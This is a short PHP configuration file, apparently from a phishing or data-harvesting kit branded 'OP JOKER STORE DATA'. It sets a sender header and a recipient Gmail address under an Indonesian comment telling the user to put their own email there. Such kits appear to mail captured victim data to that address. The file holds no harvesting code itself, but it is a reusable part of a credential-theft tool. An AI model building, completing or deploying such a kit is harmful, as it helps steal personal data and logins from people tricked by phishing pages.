<?php
// 👑 OP JOKER STORE DATA 👑
$author = '🖤OP JOKER STORE DATA💗';
$sender = 'From:🖤🇮🇳OP JOKER STORE🇮🇳💗 <lovernitrox@gmail.com>';

$emailku = 'lovernitrox@gmail.com'; // GANTI EMAIL KAMU DISINI
?>